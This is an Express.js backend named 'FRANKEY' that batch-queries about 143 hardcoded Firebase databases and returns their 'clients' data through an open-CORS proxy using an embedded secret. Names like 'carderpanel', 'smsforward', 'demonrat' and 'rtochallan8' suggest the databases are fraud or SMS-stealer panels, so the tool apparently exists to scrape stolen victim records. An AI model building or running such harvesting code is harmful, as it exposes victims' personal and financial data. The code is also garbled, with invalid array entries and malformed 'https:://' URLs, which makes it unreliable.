const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;
const PROXY_SECRET = process.env.PROXY_SECRET || 'cecf42bdea21679f419dc5672727e2c9fe7a29b00d72193425222d7077c8b4ab';

// 143 Firebase URLs — merged from 4 lists, deduplicated
const FIREBASE_URLS = [
  "https://aaenop720-34097-default-rtdb.firebaseio.com",
  "https://access20-3fc38-default-rtdb.firebaseio.com",
  "https://admin-chorsala-default-rtdb.firebaseio.com",
  "https://admin-cliwny-default-rtdb.firebaseio.com",
  "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
  "https://admin-panel-khanashif-default-rtdb.firebaseio.com",
  "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
  "https://adutappbylucy-default-rtdb.firebaseio.com",
  "https://ahisjija-default-rtdb.firebaseio.com",
  "https://ajay-33c1b-default-rtdb.firebaseio.com",
  "https://ajna-20fc4-default-rtdb.firebaseio.com",
  "https://amirrr-8a463-default-rtdb.firebaseio.com",
  "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
  "https":"https://anudg-21c1c-default-rtdb.firebaseio.com",
  "https://article-efd36-default-rtdb.firebaseio.com",
  "https://arvind-c5b03-default-rtdb.firebaseio.com",
  "https://ayan-5581d-default-rtdb.firebaseio.com",
  "https://bandhan2-7jan-default-rtdb.firebaseio.com",
  "https":"https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
  "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
  "https://bunty-51bcc-default-rtdb.firebaseio.com",
  "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
  "https://carderpanel-default-rtdb.firebaseio.com",
  "https://crahul-abcb4-default-rtdb.firebaseio.com",
  "https://danish-77fe3-default-rtdb.firebaseio.com",
  "https://dharmesh-panel-default-rtdb.firebaseio.com",
  "https://dhumm-90a53-default-rtdb.firebaseio.com",
  "https://drahul-3bd1b-default-rtdb.firebaseio.com",
  "https://download-b7393-default-rtdb.firebaseio.com",
  "https://e13turnament-1-default-rtdb.firebaseio.com",
  "https://f13turnament-1-default-rtdb.firebaseio.com",
  "https://fogda-f8255-default-rtdb.firebaseio.com",
  "https://gadhalalund-default-rtdb.firebaseio.com",
  "https://gggggg-979bd-default-rtdb.firebaseio.com",
  "https://gulabi-fuddi-default-rtdb.firebaseio.com",
  "https://haab-b3370-default-rtdb.firebaseio.com",
  "https://hloo-acc63-default-rtdb.firebaseio.com",
  "https://hood-4ba1e-default-rtdb.firebaseio.com",
  "https://harrwp-6be36-default-rtdb.firebaseio.com",
  "https://hdrbf-485ec-default-rtdb.firebaseio.com",
  "https://human-34-kumar-default-rtdb.firebaseio.com",
  "https://i-am-devil-9297c-default-rtdb.firebaseio.com",
  "https://iiiii-ade0e-default-rtdb.firebaseio.com",
  "https://imdum-6e873-default-rtdb.firebaseio.com",
  "https":"https://jinbhai-add9a-default-rtdb.firebaseio.com",
  "https://jchchc-5f16d-default-rtdb.firebaseio.com",
  "https://jeko-c11ef-default-rtdb.firebaseio.com",
  "https://jeet-op-default-rtdb.firebaseio.com",
  "https://jannu-c03ea-default-rtdb.firebaseio.com",
  "https://jj-gambler-default-rtdb.firebaseio.com",
  "https:://jpicku-47790-default-rtdb.firebaseio.com",
  "https://jkhsadfhjk-default-rtdb.firebaseio.com",
  "https://joniins-52271-default-rtdb.firebaseio.com",
  "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
  "https://kalih-f389d-default-rtdb.firebaseio.com",
  "https://love-13ffc-default-rtdb.firebaseio.com",
  "https://lucifer-spreader-default-rtdb.firebaseio.com",
  "https://mafiaaaa2oppp-default-rtdb.firebaseio.com",
  "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",
  "https:://maxxx-randi-default-rtdb.firebaseio.com",
  "https://master-admin-6c650-default-rtdb.firebaseio.com",
  "https://miyakhalifa-143d5-default-rtdb.firebaseio.com",
  "https://motka-5b21d-default-rtdb.firebaseio.com",
  "https://no-admin-e0a30-default-rtdb.firebaseio.com",
  "https://panel-wala-v16-default-rtdb.firebaseio.com",
  "https://panel123628-default-rtdb.firebaseio.com",
  "https://paro-df7ed-default-rtdb.firebaseio.com",
  "https://pm23-98f32-default-rtdb.firebaseio.com",
  "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
  "https://pint-f465b-default-rtdb.firebaseio.com",
  "https://pri14-b45dd-default-rtdb.firebaseio.com",
  "https://priysnshuu-default-rtdb.firebaseio.com",
  "https://rto-02-april06-default-rtdb.firebaseio.com",
  "https://rto3-53dc7-default-rtdb.firebaseio.com",
  "https:://rtochallan8-default-rtdb.firebaseio.com",
  "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
  "https://rajababukvirat-default-rtdb.firebaseio.com",
  "https://rajakk-80ecd-default-rtdb.firebaseio.com",
  "https:://rettiugh-default-rtdb.firebaseio.com",
  "https://rich-people-19e06-default-rtdb.firebaseio.com",
  "https:://riyy-e012e-default-rtdb.firebaseio.com",
  "https://rochet10-8919f-default-rtdb.firebaseio.com",
  "https:://rolex-carder-default-rtdb.firebaseio.com",
  "https:://root-3rto-default-rtdb.firebaseio.com",
  "https:://rmx3511uuj-default-rtdb.firebaseio.com",
  "https:://rtoo-6c8e6-default-rtdb.firebaseio.com",
  "https:://s85138920-87594-default-rtdb.firebaseio.com",
  "https:://sandycall-18b15-default-rtdb.firebaseio.com",
  "https:://seuihd-default-rtdb.firebaseio.com",
  "https:://shadow-f9cd3-default-rtdb.firebaseio.com",
  "https:://shivampanel-eb3b7-default-rtdb.firebaseio.com",
  "https:://sonu-5e324-default-rtdb.firebaseio.com",
  "https:://surya-917b9-default-rtdb.firebaseio.com",
  "https:://systumm-c8526-default-rtdb.firebaseio.com",
  "https:://suihd-default-rtdb.firebaseio.com",
  "https:://suwer-64cd1-default-rtdb.firebaseio.com",
  "https:://suman-penal-default-rtdb.firebaseio.com",
  "https:://takul-cf410-default-rtdb.firebaseio.com",
  "https:://totla-axis-default-rtdb.firebaseio.com",
  "https:://tracegod-168d5-default-rtdb.firebaseio.com",
  "https:://tuuui-60b15-default-rtdb.firebaseio.com",
  "https:://uc-op-ca3d2-default-rtdb.firebaseio.com",
  "https:://udkudjudj-default-rtdb.firebaseio.com",
  "https:://update-cf7a9-default-rtdb.firebaseio.com",
  "https:://vampirebhsuhan-default-rtdb.firebaseio.com",
  "https:://vikram01-c0306-default-rtdb.firebaseio.com",
  "https:://vvvvv-b5eae-default-rtdb.firebaseio.com",
  "https:://yono-sb41-default-rtdb.firebaseio.com",
  "https:://raja-bhaiya-62-default-rtdb.firebaseio.com",
  "https:://rexxx-4c7a7-default-rtdb.firebaseio.com",
  "https:://rgggggggggg-e2547-default-rtdb.firebaseio.com",
  "https:://gigapaid-39e9c-default-rtdb.firebaseio.com",
  "https:://fir-new-fe8b8-default-rtdb.firebaseio.com",
  "https:://alienware-c11b0-default-rtdb.firebaseio.com",
  "https:://aaenop720-34097-default-rtdb.firebaseio.com",
  "https:://your-project-id-default-rtdb.firebaseio.com",
  "https:://projectpksk05102025-default-rtdb.firebaseio.com",
  "https:://adutappbylucy-default-rtdb.firebaseio.com",
  "https:://bobnewloda-default-rtdb.firebaseio.com",
  "https:://artikumari-abc97-default-rtdb.firebaseio.com",
  "https:://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
  "https:://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
  "https:://i-am-devil-9297c-default-rtdb.firebaseio.com",
  "https:://smsforward-b2198.firebaseio.com",
  "https:://panel-op-feb4d-default-rtdb.firebaseio.com",
  "https:://demonrat-aa782-default-rtdb.firebaseio.com",
  "https:://deepak-c22e3-default-rtdb.firebaseio.com",
  "https:://deepk-hh-default-rtdb.firebaseio.com",
  "https:://dhumm-90a53-default-rtdb.firebaseio.com",
  "https:://download-b7393-default-rtdb.firebaseio.com",
  "https:://e13turnament-1-default-rtdb.firebaseio.com",
  "https:://fogda-f8255-default-rtdb.firebaseio.com",
  "https:://gulabi-fuddi-default-rtdb.firebaseio.com",
  "https:://haab-b3370-default-rtdb.firebaseio.com",
  "https:://hloo-acc63-default-rtdb.firebaseio.com",
  "https:://hood-4ba1e-default-rtdb.firebaseio.com",
  "https:://human-34-kumar-default-rtdb.firebaseio.com",
  "https:://imdum-6e873-default-rtdb.firebaseio.com",
  "https:://jinbhai-add9a-default-rtdb.firebaseio.com",
  "https:://jpicku-47790-default-rtdb.firebaseio.com",
  "https:://kalih-f389d-default-rtdb.firebaseio.com",
  "https:://krijhjuiiiccyy-default-rtdb.firebaseio.com",
  "https:://lucifer-spreader-default-rtdb.firebaseio.com",
  "https:://mahanivip-kituk10-default-rtdb.firebaseio.com",
  "https:://maxbhai-b8d3a-default-rtdb.firebaseio.com",
  "https:://miyakhalifa-143d5-default-rtdb.firebaseio.com",
  "https:://no-admin-e0a30-default-rtdb.firebaseio.com",
  "https:://pri14-b45dd-default-rtdb.firebaseio.com",
  "https:://rich-people-19e06-default-rtdb.firebaseio.com",
  "https:://riyy-e012e-default-rtdb.firebaseio.com",
  "https:://rto-02-april06-default-rtdb.firebaseio.com",
  "https:://rtochallan8-default-rtdb.firebaseio.com",
  "https:://s85138920-87594-default-rtdb.firebaseio.com",
  "https:://sandycall-18b15-default-rtdb.firebaseio.com",
  "https:://sexypayload-default-rtdb.firebaseio.com",
  "https:://shivampanel-eb3b7-default-rtdb.firebaseio.com",
  "https:://shadow-f9cd3-default-rtdb.firebaseio.com",
  "https:://sonu-5e324-default-rtdb.firebaseio.com",
  "https:://surya-917b9-default-rtdb.firebaseio.com",
  "https:://systumm-c8526-default-rtdb.firebaseio.com",
  "https:://takul-cf410-default-rtdb.firebaseio.com",
  "https:://totla-axis-default-rtdb.firebaseio.com",
  "https:://tracegod-168d5-default-rtdb.firebaseio.com",
  "https:://tuuui-60b15-default-rtdb.firebaseio.com",
  "https:://uc-op-ca3d2-default-rtdb.firebaseio.com",
  "https:://udkudjudj-default-rtdb.firebaseio.com",
  "https:://update-cf7a9-default-rtdb.firebaseio.com",
  "https:://vampirebhsuhan-default-rtdb.firebaseio.com",
  "https:://vvvvv-b5eae-default-rtdb.firebaseio.com",
  "https:://yono-sb41-default-rtdb.firebaseio.com",
  "https:://raja-bhaiya-62-default-rtdb.firebaseio.com",
  "https:://rexxx-4c7a7-default-rtdb.firebaseio.com",
  "https:://rgggggggggg-e2547-default-rtdb.firebaseio.com",
  "https:://gigapaid-39e9c-default-rtdb.firebaseio.com",
  "https:://fir-new-fe8b8-default-rtdb.firebaseio.com",
  "https:://alienware-c11b0-default-rtdb.firebaseio.com",
  "https:://aaenop720-34097-default-rtdb.firebaseio.com",
  "https:://your-project-id-default-rtdb.firebaseio.com",
  "https:://projectpksk05102025-default-rtdb.firebaseio.com",
  "https:://adutappbylucy-default-rtdb.firebaseio.com",
  "https:://bobnewloda-default-rtdb.firebaseio.com",
  "https:://artikumari-abc97-default-rtdb.firebaseio.com",
  "https:://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
  "https:://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
  "https:://i-am-devil-9297c-default-rtdb.firebaseio.com",
  "https:://smsforward-b2198.firebaseio.com",
  "https:://panel-op-feb4d-default-rtdb.firebaseio.com"
];

app.use(cors({ origin: '*', methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], allowedHeaders: ['Content-Type', 'Authorization', 'X-Proxy-Secret', 'X-Firebase-Url', 'X-Firebase-Path'] }));
app.options('*', cors());
app.use(express.json());
app.use(express.static('public'));

app.get('/api/health', (req, res) => {
  res.json({ status: 'live', timestamp: new Date().toISOString(), firebaseCount: FIREBASE_URLS.length });
});

app.get('/api/firebase/fetch', async (req, res) => {
  const { url, path, key } = req.query;
  const firebaseUrl = url || req.headers['x-firebase-url'];
  const firebasePath = path || req.headers['x-firebase-path'] || 'clients';
  const authKey = key || req.headers['x-proxy-secret'] || PROXY_SECRET;
  if (!firebaseUrl) return res.status(400).json({ error: 'Firebase URL is required. Pass ?url= or X-Firebase-Url header.' });
  try {
    const cleanUrl = firebaseUrl.replace(/\/$/, '');
    const fullUrl = `${cleanUrl}/${firebasePath}.json?auth=${encodeURIComponent(authKey)}`;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    const response = await fetch(fullUrl, { signal: controller.signal, headers: { 'Accept': 'application/json' } });
    clearTimeout(timeout);
    if (!response.ok) {
      const text = await response.text().catch(() => '');
      let errorMsg = `HTTP ${response.status}`;
      if (response.status === 401 || response.status === 403) errorMsg = 'PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key (not API key). Also check Realtime Database Rules allow read.';
      else if (response.status === 404) errorMsg = `NOT_FOUND: Database path "${firebasePath}" not found.`;
      return res.status(response.status).json({ error: errorMsg, detail: text.slice(0, 300) });
    }
    const data = await response.json();
    res.json({ success: true, url: firebaseUrl, path: firebasePath, data, fetchedAt: new Date().toISOString() });
  } catch (error) {
    if (error.name === 'AbortError') return res.status(504).json({ error: 'Firebase request timed out (15s).' });
    res.status(500).json({ error: `Fetch failed: ${error.message}` });
  }
});

app.get('/api/firebase/batch', async (req, res) => {
  const { path, key } = req.query;
  const authKey = key || PROXY_SECRET;
  const firebasePath = path || 'clients';
  const results = [];
  for (const firebaseUrl of FIREBASE_URLS) {
    try {
      const cleanUrl = firebaseUrl.replace(/\/$/, '');
      const fullUrl = `${cleanUrl}/${firebasePath}.json?auth=${encodeURIComponent(authKey)}`;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      const response = await fetch(fullUrl, { signal: controller.signal });
      clearTimeout(timeout);
      if (response.ok) {
        const data = await response.json();
        results.push({ url: firebaseUrl, status: 'active', data, fetchedAt: new Date().toISOString() });
      } else {
        results.push({ url: firebaseUrl, status: 'locked', error: `HTTP ${response.status}` });
      }
    } catch (error) {
      results.push({ url: firebaseUrl, status: 'error', error: error.message });
    }
  }
  res.json({ success: true, total: FIREBASE_URLS.length, active: results.filter(r => r.status === 'active').length, locked: results.filter(r => r.status === 'locked').length, results });
});

app.listen(PORT, () => {
  console.log(`FRANKEY Backend is Live! Port: ${PORT}`);
  console.log(`Firebase URLs loaded: ${FIREBASE_URLS.length}`);
});